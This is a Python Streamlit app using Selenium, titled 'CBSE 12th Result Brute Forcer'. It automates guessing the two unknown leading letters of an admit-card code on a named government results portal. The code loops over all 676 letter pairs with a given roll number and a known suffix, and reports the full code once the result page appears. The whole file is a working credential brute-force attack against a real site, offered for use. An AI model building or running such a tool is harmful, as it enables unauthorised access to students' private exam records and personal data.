import streamlit as st
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import os
import time
import string

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

# Selectors
FIELD1 = (By.ID, "rroll")
FIELD2 = (By.ID, "admn_id")
SUBMIT = (By.ID, "submit")

# Streamlit UI Configuration
st.set_page_config(page_title="CBSE Brute Force", page_icon="🔍")
st.title("🔍 CBSE 12th Result Brute Forcer")

# Sidebar for Inputs
with st.sidebar:
    st.header("Settings")
    roll_val = st.text_input("Roll Number", value="18615895")
    suffix_val = st.text_input("Known Suffix (Last 6)", value="954511")
    delay_val = st.slider("Attempt Delay", 0.5, 5.0, 1.5)

# ========================= DRIVER SETUP =========================
def get_driver():
    options = Options()
    options.add_argument("--headless=new") # Required for Render
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1280,720")
    
    # Path where render-build.sh installed Chrome
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        options.binary_location = render_bin
        
    # Selenium 4.10+ handles the driver download automatically
    return webdriver.Chrome(options=options)

# ========================= SUCCESS LOGIC =========================
def is_success(driver):
    """Keep same logic as your local script"""
    try:
        # Check for visible error message
        error_elements = driver.find_elements(By.ID, "err_msg")
        if error_elements:
            error_elem = error_elements[0]
            if error_elem.is_displayed() and "no data found" in error_elem.text.lower():
                return False
        
        # Success indicators
        success_indicators = ["marks", "result", "subject", "grade", "total"]
        page_text = driver.page_source.lower()
        if any(ind in page_text for ind in success_indicators):
            return True
            
        if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
            return True
    except:
        pass
    return False

# ========================= MAIN LOOP =========================
if st.button("🚀 Start Brute Force", type="primary"):
    status_log = st.empty()
    progress_bar = st.progress(0)
    log_area = st.expander("Attempt Logs", expanded=True)
    
    driver = None
    try:
        driver = get_driver()
        driver.get(URL)
        status_log.success("✅ Page loaded. Starting attempts...")
        
        letters = string.ascii_uppercase
        combos = [f"{a}{b}" for a in letters for b in letters]
        
        for i, prefix in enumerate(combos):
            code = f"{prefix}{suffix_val}"
            
            # Update UI
            status_log.info(f"Trying: **{prefix}** ({i+1}/{len(combos)})")
            progress_bar.progress((i + 1) / len(combos))
            
            try:
                # Reload page every loop to ensure elements are clean (prevent Stale Errors)
                driver.get(URL)
                wait = WebDriverWait(driver, 10)
                
                f1 = wait.until(EC.presence_of_element_located(FIELD1))
                f2 = driver.find_element(*FIELD2)
                
                f1.clear()
                f1.send_keys(roll_val)
                f2.clear()
                f2.send_keys(code)
                
                driver.find_element(*SUBMIT).click()
                
                time.sleep(delay_val)
                
                if is_success(driver):
                    st.balloons()
                    st.success(f"🎉 **SUCCESS FOUND!**")
                    st.write(f"**Prefix:** {prefix}")
                    st.write(f"**Full Code:** {code}")
                    break
                else:
                    log_area.write(f"❌ {prefix} failed.")
                    
            except Exception as loop_e:
                log_area.error(f"⚠️ Error on {prefix}: {str(loop_e)[:50]}")
                continue
        else:
            st.error("❌ Finished all 676 attempts without success.")
            
    except Exception as e:
        st.error(f"Critical Error: {e}")
    finally:
        if driver:
            driver.quit()
